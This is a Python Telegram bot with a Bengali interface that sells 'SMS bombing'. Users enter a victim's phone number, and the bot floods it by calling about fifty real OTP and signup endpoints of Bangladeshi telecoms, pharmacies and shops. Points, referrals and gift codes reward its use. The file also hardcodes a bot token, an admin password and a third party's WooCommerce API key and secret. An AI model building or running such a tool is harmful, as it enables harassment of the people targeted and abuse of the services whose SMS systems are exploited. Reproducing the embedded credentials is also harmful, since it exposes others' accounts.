import logging
import json
import os
import tempfile
import requests
from telegram import Update, ReplyKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder, ContextTypes, CommandHandler, 
    MessageHandler, filters, ConversationHandler
)

# --- Logging Configuration ---
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# --- Configurations & Secrets ---
BOT_TOKEN = "8919487240:AAFDfvsfNAVcdyYrmQgOnQaeyiOMvqMQVto"
ADMIN_SECRET_CODE = "Obayed"
ADMIN_USERNAME = "@OBAYEDSHAMS"

# --- Permanent Database File Setup (Atomic Save) ---
DB_FILE = "users_database.json"

def load_database():
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE, "r", encoding="utf-8") as f:
                content = f.read().strip()
                if not content:
                    return {}
                data = json.loads(content)
                return {int(k): v for k, v in data.items()}
        except Exception as e:
            logger.error(f"Error loading database: {e}")
    return {}

def save_database():
    try:
        # Atomic write: ডেটা করাপ্ট হওয়া রোধ করতে প্রথমে টেম্পোরারি ফাইলে সেভ করে তারপর মূল ফাইলের সাথে রিপ্লেস করা হবে
        dir_name = os.path.dirname(DB_FILE) or "."
        with tempfile.NamedTemporaryFile("w", dir=dir_name, delete=False, encoding="utf-8") as tf:
            json.dump(users_db, tf, ensure_ascii=False, indent=4)
            temp_name = tf.name
        os.replace(temp_name, DB_FILE)
    except Exception as e:
        logger.error(f"Error saving database: {e}")

users_db = load_database()

gift_codes = {
    "FREE2": 2,
    "BONUS5": 5,
    "START10": 10,
    "OBAYED": 6,
    "BOOSTER20": 20
}

GIFT_CODE_INPUT, SMS_PHONE_INPUT, BOOSTER_PHONE_INPUT, ADMIN_LOGIN_INPUT, ADMIN_ADD_GIFT_INPUT = range(5)

# --- Keyboards ---
def get_user_keyboard():
    return ReplyKeyboardMarkup([
        ["📊 Account Info", "🚀 SMS Bombing (20 SMS)"],
        ["🔥 Powerful SMS (Booster)", "🔗 Referral Link"],
        ["🎁 Redeem Gift Code", "📞 Support / Help"],
        ["🔐 Admin Panel"]
    ], resize_keyboard=True)

def get_admin_keyboard():
    return ReplyKeyboardMarkup([
        ["➕ Add Gift Code", "👥 Total Users"],
        ["🔙 Back to User Menu"]
    ], resize_keyboard=True)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    args = context.args
    is_new_user = user_id not in users_db

    if is_new_user:
        referrer_id = None
        if args and args[0].isdigit():
            ref_id = int(args[0])
            if ref_id in users_db and ref_id != user_id:
                referred_list = users_db[ref_id].setdefault("referred_users", [])
                if user_id not in referred_list:
                    referrer_id = ref_id
                    users_db[referrer_id]["points"] += 1
                    users_db[referrer_id]["referred_users"].append(user_id)
                    save_database()
                    try:
                        await context.bot.send_message(
                            chat_id=referrer_id,
                            text=f"🎉 দুর্দান্ত! নতুন একজন ইউজার ({user_id}) আপনার রেফারেল লিংকে জয়েন করায় আপনার অ্যাকাউন্টে **১ পয়েন্ট** যুক্ত হয়েছে!"
                        )
                    except Exception as e:
                        logger.error(f"Referral Notification Error: {e}")

        users_db[user_id] = {
            "points": 2,
            "referred_by": referrer_id,
            "referred_users": [],
            "is_admin": False
        }
        save_database()
        welcome_text = (
            "🎉 **স্বাগতম!**\n\n"
            "বোটটি সফলভাবে স্টার্ট করার জন্য আপনার অ্যাকাউন্টে স্বয়ংক্রিয়ভাবে **২ পয়েন্ট** যোগ করা হয়েছে!\n"
            "নিচের মেনু থেকে আপনার প্রয়োজনীয় অপশনটি বেছে নিন:"
        )
    else:
        welcome_text = "👋 স্বাগতম! আপনার বোট মেনু নিচে দেওয়া হলো:"

    await update.message.reply_text(
        welcome_text,
        reply_markup=get_user_keyboard(),
        parse_mode="Markdown"
    )
    return ConversationHandler.END

async def show_account_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    users_db.setdefault(user_id, {"points": 2, "referred_by": None, "referred_users": [], "is_admin": False})
    save_database()
    user = users_db[user_id]
    total_referred = len(user.get("referred_users", []))
    
    msg = (
        f"👤 **আপনার অ্যাকাউন্ট ইনফো:**\n\n"
        f"🆔 User ID: `{user_id}`\n"
        f"💰 Balance Points: **{user['points']} Points**\n"
        f"👥 Total Referred: **{total_referred} জন**\n"
        f"⚡ Powerful SMS Booster: **প্রতি ১০ পয়েন্টে ৫০টি রিয়েল রিকোয়েস্ট**\n"
        f"👑 Admin Contact: {ADMIN_USERNAME}"
    )
    await update.message.reply_text(msg, parse_mode="Markdown")

async def show_referral_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    users_db.setdefault(user_id, {"points": 2, "referred_by": None, "referred_users": [], "is_admin": False})
    save_database()
    bot_username = context.bot.username
    ref_link = f"https://t.me/{bot_username}?start={user_id}"
    
    msg = (
        f"🔗 **আপনার রেফারেল লিংক:**\n`{ref_link}`\n\n"
        f"🎁 নতুন কেউ এই লিংকে প্রথমবারের মতো বোট স্টার্ট করলেই আপনি পাবেন **১ পয়েন্ট**!\n"
        f"*(নোট: একটি টেলিগ্রাম আইডি কেবল একবারই রেফারেল হিসেবে গণ্য হবে।)*"
    )
    await update.message.reply_text(msg, parse_mode="Markdown")

async def show_support(update: Update, context: ContextTypes.DEFAULT_TYPE):
    support_msg = (
        f"📞 **সাহায্য ও সাপোর্ট:**\n\n"
        f"• ফ্রিতে পয়েন্ট পেতে **🔗 Referral Link** থেকে আপনার বন্ধুদের ইনভাইট করুন।\n"
        f"• গিফট কোড পেতে অ্যাডমিনের দেওয়া কোড **🎁 Redeem Gift Code** এ ব্যবহার করুন।\n"
        f"• যেকোনো প্রয়োজনে যোগাযোগ করুন: {ADMIN_USERNAME}"
    )
    await update.message.reply_text(support_msg, parse_mode="Markdown")

# --- সম্পূর্ণ ৫০টি রিয়েল API এর তালিকা ---
def get_all_apis(n):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept": "application/json, text/plain, */*"
    }
    
    apis = [
        lambda: requests.get(f'https://api.medeasy.health/api/send-otp/{n}/', headers=headers, timeout=3),
        lambda: requests.post('https://api.shikho.com/auth/v2/send/sms', json={'phone': n, 'type': 'student'}, headers=headers, timeout=3),
        lambda: requests.post('https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en', json={'phone': n}, headers=headers, timeout=3),
        lambda: requests.post('https://api-dynamic.chorki.com/v1/auth/login?country=BD&platform=mobile', json={'phone': n}, headers=headers, timeout=3),
        lambda: requests.get(f'https://api.arogga.com/auth/v1/sms/send/?f=web&b=Chrome&v=122.0.0.0&os=Windows&osv=10&phone={n}', headers=headers, timeout=3),
        lambda: requests.post('https://api.redx.com.bd/v1/user/signup', json={'phoneNumber': n}, headers=headers, timeout=3),
        lambda: requests.get(f'https://api.khaasfood.com/api/app/one-time-passwords/token?username={n}', headers=headers, timeout=3),
        lambda: requests.post('https://accountkit.sheba.xyz/api/shoot-otp', json={'phone': n}, headers=headers, timeout=3),
        lambda: requests.post('https://api.apex4u.com/api/auth/login', json={'phone': n}, headers=headers, timeout=3),
        lambda: requests.post('https://offers.sindabad.com/api/mobile-otp', json={'phone': n}, headers=headers, timeout=3),
        lambda: requests.post('https://app.kireibd.com/api/v2/send-login-otp', json={'phone': n}, headers=headers, timeout=3),
        lambda: requests.post('https://api.bdtickets.com:20100/v1/auth', json={'phone': n}, headers=headers, timeout=3),
        lambda: requests.post('https://rflbestbuy.com/api/login/?lang_code=en&currency_code=BDT', json={'phone': n}, headers=headers, timeout=3),
        lambda: requests.post('https://doctorlivebd.com/api/patient/auth/otpsend', json={'phone': n}, headers=headers, timeout=3),
        lambda: requests.post('https://admin.beautybooth.com.bd/api/v2/auth/signup', json={'phone': n}, headers=headers, timeout=3),
        lambda: requests.post('https://billing.proiojon.com/api/v1/auth/sign-up', json={'phone': n}, headers=headers, timeout=3),
        lambda: requests.get(f'https://api.doctime.com.bd/api/authenticate?phone={n}', headers=headers, timeout=3),
        lambda: requests.get(f'https://m-backend.wafilife.com/wp-json/wc/v2/send-otp?p={n}&consumer_key=ck_e8c5b4a69729dd913dce8be03d7878531f6511ff&consumer_secret=cs_f866e5c6543065daa272504c2eea71044579cff3', headers=headers, timeout=3),
        lambda: requests.post('https://developer.medha.info/api/send-otp', json={'phone': n}, headers=headers, timeout=3),
        lambda: requests.get(f'https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={n}', headers=headers, timeout=3),
        lambda: requests.post('https://fundesh.com.bd/api/auth/generateOTP', json={'msisdn': n}, headers=headers, timeout=3),
        lambda: requests.post('https://webapi.robi.com.bd/v1/send-otp', json={'phone_number': n, 'type': 'doorstep'}, headers=headers, timeout=3),
        lambda: requests.get(f'https://web-api.banglalink.net/api/v1/user/number/validation/{n}', headers=headers, timeout=3),
        lambda: requests.post('https://web-api.banglalink.net/api/v1/user/otp-login/request', json={'mobile': n}, headers=headers, timeout=3),
        lambda: requests.post('https://webloginda.grameenphone.com/backend/api/v1/otp', data=f'msisdn={n}', headers={**headers, 'Content-Type': 'application/x-www-form-urlencoded'}, timeout=3),
        lambda: requests.post('https://da-api.robi.com.bd/da-nll/otp/send', json={'msisdn': n}, headers=headers, timeout=3),
        lambda: requests.post('https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp', json={'phoneNumber': n}, headers=headers, timeout=3),
        lambda: requests.get(f'https://mujib.chorcha.net/auth/check?phone={n}', headers=headers, timeout=3),
        lambda: requests.get(f'https://api.chardike.com/api/chardike-login-need?phone={n}', headers=headers, timeout=3),
        lambda: requests.post('https://dev.etestpaper.net/api/v4/auth/otp', json={'phone': n}, headers=headers, timeout=3),
        lambda: requests.post('https://apps.applink.com.bd/appstore-v4-server/login/otp/request', json={'phone': n}, headers=headers, timeout=3),
        lambda: requests.post('https://app.priyoshikkhaloy.com/api/user/register-login.php', json={'phone': n}, headers=headers, timeout=3),
        lambda: requests.post('https://api.kabbik.com/v1/auth/otpnew', json={'phone': n}, headers=headers, timeout=3),
        lambda: requests.post('https://salextra.com.bd/customer/checkusernameavailabilityonregistration', json={'phone': n}, headers=headers, timeout=3),
        lambda: requests.get(f'https://api.mygp.cinematic.mobi/api/v1/otp/88{n}/SBENT_3GB7D', headers=headers, timeout=3),
        lambda: requests.get(f'https://bajistar.com:1443/public/api/v1/getOtp?recipient=88{n}', headers=headers, timeout=3),
        lambda: requests.get(f'https://meenabazardev.com/api/mobile/front/send/otp?CellPhone={n}&type=login', headers=headers, timeout=3),
        lambda: requests.get(f'http://apibeta.iqra-live.com/api/v1/sent-otp/{n}', headers=headers, timeout=3),
        lambda: requests.post('https://chokrojan.com/api/v1/passenger/login/mobile', json={'phone': n}, headers=headers, timeout=3),
        lambda: requests.post('https://backend-api.shomvob.co/api/v2/otp/phone?is_retry=0', json={'phone': n}, headers=headers, timeout=3),
        lambda: requests.post('https://ultimateasiteapi.com/api/register-customer', json={'phone': n}, headers=headers, timeout=3),
        lambda: requests.post('https://foodaholic.com.bd/api/v1/auth/login-otp', json={'phone': n}, headers=headers, timeout=3),
        lambda: requests.post('https://api.kfcbd.com/register', json={'phone': n}, headers=headers, timeout=3),
        lambda: requests.post('https://app.eonbazar.com/api/auth/register', json={'phone': n}, headers=headers, timeout=3),
        lambda: requests.post('https://api.eat-z.com/auth/customer/app-connect', json={'phone': n}, headers=headers, timeout=3),
        lambda: requests.post('https://api.osudpotro.com/api/v1/users/send_otp', json={'phone': n}, headers=headers, timeout=3),
        lambda: requests.post('https://www.shwapno.com/api/auth', json={'phone': n}, headers=headers, timeout=3),
        lambda: requests.get(f'https://developer.quizgiri.xyz:443/api/v2.0/send-otp?phone={n}', headers=headers, timeout=3),
        lambda: requests.post('https://myblapi.banglalink.net/api/v1/send-otp', json={'phone': n}, headers=headers, timeout=3),
        lambda: requests.post('https://apialpha.pbs.com.bd/api/OTP/generateOTP', json={'phone': n}, headers=headers, timeout=3)
    ]
    return apis

# --- সাধারণ SMS Bombing (২ পয়েন্টে ২০টি) ---
async def start_sms_bombing(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    users_db.setdefault(user_id, {"points": 2, "referred_by": None, "referred_users": [], "is_admin": False})
    save_database()
    
    if users_db[user_id]["points"] < 2:
        await update.message.reply_text("❌ আপনার পর্যাপ্ত পয়েন্ট নেই! অন্তত **২ পয়েন্ট** প্রয়োজন।", reply_markup=get_user_keyboard())
        return ConversationHandler.END

    await update.message.reply_text("📱 সাধারণ SMS Bombing এর জন্য টার্গেট মোবাইল নম্বরটি দিন (যেমন: `017xxxxxxxx`):\n\n*(বাতিল করতে /cancel লিখুন)*", parse_mode="Markdown")
    return SMS_PHONE_INPUT

async def process_sms_bombing(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    users_db.setdefault(user_id, {"points": 2, "referred_by": None, "referred_users": [], "is_admin": False})
    phone = update.message.text.strip()

    if not phone.isdigit() or len(phone) < 10:
        await update.message.reply_text("❌ সঠিক মোবাইল নম্বর দিন। আবার চেষ্টা করুন:")
        return SMS_PHONE_INPUT

    users_db[user_id]["points"] -= 2
    save_database()
    
    await update.message.reply_text(f"🚀 `{phone}` নম্বরে ২০টি API থেকে রিকোয়েস্ট পাঠানো হচ্ছে...", parse_mode="Markdown")

    success_count = 0
    all_apis = get_all_apis(phone)
    
    for api_func in all_apis[:20]:
        try:
            res = api_func()
            if res.status_code < 500:
                success_count += 1
        except Exception as e:
            logger.error(f"API Error: {e}")

    await update.message.reply_text(
        f"✅ সাধারণ SMS Bombing সম্পন্ন!\n"
        f"🎯 সফল রেসপন্স: {success_count}/20 টি\n"
        f"💰 খরচ হয়েছে: ২ পয়েন্ট\n"
        f"💰 বর্তমান পয়েন্ট: **{users_db[user_id]['points']}**",
        reply_markup=get_user_keyboard(),
        parse_mode="Markdown"
    )
    return ConversationHandler.END

# --- Powerful SMS Booster (১০ পয়েন্টে ৫০টি API) ---
async def start_booster(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    users_db.setdefault(user_id, {"points": 2, "referred_by": None, "referred_users": [], "is_admin": False})
    save_database()
    
    if users_db[user_id]["points"] < 10:
        await update.message.reply_text("❌ আপনার পর্যাপ্ত পয়েন্ট নেই!\n🔥 **Powerful SMS Booster** চালাতে অন্তত **১০ পয়েন্ট** প্রয়োজন।", reply_markup=get_user_keyboard())
        return ConversationHandler.END

    await update.message.reply_text("🔥 **Powerful SMS Booster** মোড চালু হয়েছে!\nটার্গেট মোবাইল নম্বরটি লিখুন (যেমন: `017xxxxxxxx`):\n\n*(বাতিল করতে /cancel লিখুন)*", parse_mode="Markdown")
    return BOOSTER_PHONE_INPUT

async def process_booster(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    users_db.setdefault(user_id, {"points": 2, "referred_by": None, "referred_users": [], "is_admin": False})
    phone = update.message.text.strip()

    if not phone.isdigit() or len(phone) < 10:
        await update.message.reply_text("❌ সঠিক মোবাইল নম্বর দিন। আবার চেষ্টা করুন:")
        return BOOSTER_PHONE_INPUT

    users_db[user_id]["points"] -= 10
    save_database()
    
    await update.message.reply_text(f"🔥 `{phone}` নম্বরে একযোগে **৫০টি রিয়েল API** থেকে বুস্টার রিকোয়েস্ট ফায়ার করা হচ্ছে...", parse_mode="Markdown")

    success_count = 0
    all_apis = get_all_apis(phone)
    
    for api_func in all_apis:
        try:
            res = api_func()
            if res.status_code < 500:
                success_count += 1
        except Exception as e:
            logger.error(f"Booster API Error: {e}")

    await update.message.reply_text(
        f"⚡ **Powerful SMS Booster সম্পন্ন!**\n"
        f"🎯 সফল রিকোয়েস্ট: {success_count}/50 টি\n"
        f"🔥 খরচ হয়েছে: ১০ পয়েন্ট\n"
        f"💰 বর্তমান পয়েন্ট: **{users_db[user_id]['points']}**",
        reply_markup=get_user_keyboard(),
        parse_mode="Markdown"
    )
    return ConversationHandler.END

# --- Gift Code System ---
async def start_redeem_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🎁 আপনার গিফট কোডটি এখানে লিখুন:\n\n*(বাতিল করতে /cancel লিখুন)*")
    return GIFT_CODE_INPUT

async def process_redeem_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    users_db.setdefault(user_id, {"points": 2, "referred_by": None, "referred_users": [], "is_admin": False})
    save_database()
    
    code = update.message.text.strip().upper()

    if code in gift_codes:
        reward = gift_codes.pop(code)
        users_db[user_id]["points"] += reward
        save_database()
        
        await update.message.reply_text(
            f"🎉 কোড রিডিম সফল! আপনি পেয়েছেন **{reward} পয়েন্ট**。\n💰 বর্তমান পয়েন্ট: **{users_db[user_id]['points']}**",
            reply_markup=get_user_keyboard(),
            parse_mode="Markdown"
        )
    else:
        await update.message.reply_text(
            "❌ ভুল অথবা ইতিমধ্যে ব্যবহৃত গিফট কোড!",
            reply_markup=get_user_keyboard()
        )
    return ConversationHandler.END

# --- Admin Panel ---
async def start_admin_login(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    users_db.setdefault(user_id, {"points": 2, "referred_by": None, "referred_users": [], "is_admin": False})
    save_database()
    
    if users_db[user_id]["is_admin"]:
        await update.message.reply_text(f"👨‍💻 অ্যাডমিন প্যানেলে স্বাগতম (Admin: {ADMIN_USERNAME}):", reply_markup=get_admin_keyboard())
        return ConversationHandler.END

    await update.message.reply_text("🔐 অ্যাডমিন সেকশনে প্রবেশ করতে সিক্রেট পাসওয়ার্ডটি লিখুন:")
    return ADMIN_LOGIN_INPUT

async def process_admin_login(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    users_db.setdefault(user_id, {"points": 2, "referred_by": None, "referred_users": [], "is_admin": False})
    code = update.message.text.strip()

    if code == ADMIN_SECRET_CODE:
        users_db[user_id]["is_admin"] = True
        save_database()
        await update.message.reply_text(f"✅ পাসওয়ার্ড সঠিক! অ্যাডমিন মোড চালু হয়েছে। ({ADMIN_USERNAME})", reply_markup=get_admin_keyboard())
    else:
        await update.message.reply_text("❌ ভুল পাসওয়ার্ড!", reply_markup=get_user_keyboard())
    return ConversationHandler.END

async def switch_to_user_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🔙 ইউজার মেনুতে ফিরে আসা হলো।", reply_markup=get_user_keyboard())

async def admin_total_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    total_users = len(users_db)
    await update.message.reply_text(f"👥 মোট নিবন্ধিত ইউজার: **{total_users} জন**", parse_mode="Markdown")

async def start_add_gift(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("➕ নতুন গিফট কোড তৈরি করতে প্রথমে কোডের নাম এবং পরে ব্যালেন্স লিখুন (উদাহরণ: `OBAYEDNEW 10`)", parse_mode="Markdown")
    return ADMIN_ADD_GIFT_INPUT

async def process_add_gift(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip().split()
    if len(text) == 2 and text[1].isdigit():
        code, amount = text[0].upper(), int(text[1])
        gift_codes[code] = amount
        await update.message.reply_text(f"✅ নতুন গিফট কোড তৈরি হয়েছে: `{code}` ({amount} Pts)", reply_markup=get_admin_keyboard(), parse_mode="Markdown")
    else:
        await update.message.reply_text("❌ সঠিক ফরম্যাটে লিখুন! যেমন: `BONUS10 10`", reply_markup=get_admin_keyboard())
    return ConversationHandler.END

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ অপারেশন বাতিল করা হয়েছে।", reply_markup=get_user_keyboard())
    return ConversationHandler.END

def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()

    cancel_filter = filters.Regex("^(📊 Account Info|🚀 SMS Bombing \\(20 SMS\\)|🔥 Powerful SMS \\(Booster\\)|🔗 Referral Link|🎁 Redeem Gift Code|📞 Support / Help|🔐 Admin Panel)$")

    sms_conv = ConversationHandler(
        entry_points=[MessageHandler(filters.Regex("^🚀 SMS Bombing \\(20 SMS\\)"), start_sms_bombing)],
        states={
            SMS_PHONE_INPUT: [
                MessageHandler(cancel_filter, cancel),
                MessageHandler(filters.TEXT & ~filters.COMMAND, process_sms_bombing)
            ]
        },
        fallbacks=[CommandHandler("cancel", cancel)]
    )

    booster_conv = ConversationHandler(
        entry_points=[MessageHandler(filters.Regex("^🔥 Powerful SMS \\(Booster\\)"), start_booster)],
        states={
            BOOSTER_PHONE_INPUT: [
                MessageHandler(cancel_filter, cancel),
                MessageHandler(filters.TEXT & ~filters.COMMAND, process_booster)
            ]
        },
        fallbacks=[CommandHandler("cancel", cancel)]
    )

    gift_conv = ConversationHandler(
        entry_points=[MessageHandler(filters.Regex("^🎁 Redeem Gift Code"), start_redeem_code)],
        states={
            GIFT_CODE_INPUT: [
                MessageHandler(cancel_filter, cancel),
                MessageHandler(filters.TEXT & ~filters.COMMAND, process_redeem_code)
            ]
        },
        fallbacks=[CommandHandler("cancel", cancel)]
    )

    admin_login_conv = ConversationHandler(
        entry_points=[MessageHandler(filters.Regex("^🔐 Admin Panel"), start_admin_login)],
        states={
            ADMIN_LOGIN_INPUT: [
                MessageHandler(cancel_filter, cancel),
                MessageHandler(filters.TEXT & ~filters.COMMAND, process_admin_login)
            ]
        },
        fallbacks=[CommandHandler("cancel", cancel)]
    )

    admin_add_gift_conv = ConversationHandler(
        entry_points=[MessageHandler(filters.Regex("^➕ Add Gift Code"), start_add_gift)],
        states={
            ADMIN_ADD_GIFT_INPUT: [
                MessageHandler(cancel_filter, cancel),
                MessageHandler(filters.TEXT & ~filters.COMMAND, process_add_gift)
            ]
        },
        fallbacks=[CommandHandler("cancel", cancel)]
    )

    app.add_handler(CommandHandler("start", start))
    app.add_handler(sms_conv)
    app.add_handler(booster_conv)
    app.add_handler(gift_conv)
    app.add_handler(admin_login_conv)
    app.add_handler(admin_add_gift_conv)

    app.add_handler(MessageHandler(filters.Regex("^📊 Account Info"), show_account_info))
    app.add_handler(MessageHandler(filters.Regex("^🔗 Referral Link"), show_referral_link))
    app.add_handler(MessageHandler(filters.Regex("^📞 Support / Help"), show_support))
    app.add_handler(MessageHandler(filters.Regex("^🔙 Back to User Menu"), switch_to_user_menu))
    app.add_handler(MessageHandler(filters.Regex("^👥 Total Users"), admin_total_users))

    print(f"🤖 বোট সফলভাবে রান হচ্ছে... Admin: {ADMIN_USERNAME}")
    app.run_polling()

if __name__ == "__main__":
    main()
